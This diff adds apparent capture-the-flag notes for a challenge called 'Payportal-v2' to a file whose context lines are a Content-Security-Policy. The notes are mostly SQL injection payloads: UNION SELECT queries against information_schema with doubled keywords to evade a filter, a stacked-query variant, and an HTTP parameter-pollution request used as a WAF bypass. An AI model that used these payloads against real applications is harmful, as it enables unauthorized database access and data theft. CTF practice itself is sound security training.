@@ -42,3 +42,33 @@ img-src i.picsum.photos unsplash.it
 'strict-dynamic'
 
 
+#Science Tomorrow
+
+
+
+
+
+
+
+#Payportal-v2
+
+SQLi 
+
+group_concat exfiltration
+
+
+a" uunionnion seselectlect 1,(selselectect table_name from information_schema.columns where column_name like '%period%'),3,4,5,6,7,"8
+
+
+non group_concat exfiltration method (normal union)
+escaping using a second select statement
+
+a" uunionnion seselectlect 1,table_name,column_name,4,5,6,7,8 from information_schema.columns;select "1
+
+
+
+FINAL flag payload
+USING A WAF bypass
+HTTP PARAMETER POLLUTION
+
+GET /api/payportal-v2/?period="+o&period="or+3="3 HTTP/2
